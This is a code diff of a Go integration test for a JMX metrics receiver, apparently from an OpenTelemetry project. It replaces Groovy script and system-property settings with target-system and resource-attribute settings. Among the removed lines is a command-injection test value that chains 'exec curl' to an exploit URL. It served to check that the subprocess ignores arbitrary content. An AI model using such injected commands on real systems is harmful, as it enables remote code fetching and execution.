@@ -157,7 +157,7 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 				CollectionInterval: 100 * time.Millisecond,
 				Endpoint:           fmt.Sprintf("%v:7199", hostname),
 				JARPath:            jar,
-				GroovyScript:       filepath.Join("testdata", "script.groovy"),
+				TargetSystem:       "cassandra",
 				OTLPExporterConfig: otlpExporterConfig{
 					Endpoint: "127.0.0.1:0",
 					TimeoutSettings: exporterhelper.TimeoutSettings{
@@ -166,15 +166,11 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 				},
 				Password: "cassandra",
 				Username: "cassandra",
-				Properties: map[string]string{
-					// should be used by Autoconfigure to set resource attributes
-					"otel.resource.attributes": "myattr=myvalue,myotherattr=myothervalue",
-					// test script sets dp labels from these system property values
-					"my.label.name": "mylabel", "my.label.value": "myvalue",
-					"my.other.label.name": "myotherlabel", "my.other.label.value": "myothervalue",
-					// confirmation that arbitrary content isn't executed by subprocess
-					"one": "two & exec curl http://example.com/exploit && exit 123",
+				ResourceAttributes: map[string]string{
+					myattr:      "myvalue",
+					myotherattr: "myothervalue",
 				},
+				LogLevel: "debug",
 			}
 			require.NoError(t, cfg.validate())
 
@@ -237,14 +233,14 @@ func (suite *JMXIntegrationSuite) TestJMXReceiverHappyPath() {
 				require.False(t, sum.IsMonotonic())
 
 				// These labels are determined by system properties
-				labels := sum.DataPoints().At(0).Attributes()
-				customLabel, ok := labels.Get("mylabel")
-				require.True(t, ok)
-				require.Equal(t, "myvalue", customLabel.StringVal())
+				// labels := sum.DataPoints().At(0).Attributes()
+				// customLabel, ok := labels.Get("mylabel")
+				// require.True(t, ok)
+				// require.Equal(t, "myvalue", customLabel.StringVal())
 
-				anotherCustomLabel, ok := labels.Get("myotherlabel")
-				require.True(t, ok)
-				require.Equal(t, "myothervalue", anotherCustomLabel.StringVal())
+				// anotherCustomLabel, ok := labels.Get("myotherlabel")
+				// require.True(t, ok)
+				// require.Equal(t, "myothervalue", anotherCustomLabel.StringVal())
 
 				return true
 			}, 30*time.Second, 100*time.Millisecond, getJavaStdout(receiver))
@@ -258,8 +254,7 @@ func TestJMXReceiverInvalidOTLPEndpointIntegration(t *testing.T) {
 		CollectionInterval: 100 * time.Millisecond,
 		Endpoint:           fmt.Sprintf("service:jmx:rmi:///jndi/rmi://localhost:7199/jmxrmi"),
 		JARPath:            "/notavalidpath",
-		Properties:         make(map[string]string),
-		GroovyScript:       filepath.Join("testdata", "script.groovy"),
+		TargetSystem:       "jvm",
 		OTLPExporterConfig: otlpExporterConfig{
 			Endpoint: "<invalid>:123",
 			TimeoutSettings: exporterhelper.TimeoutSettings{
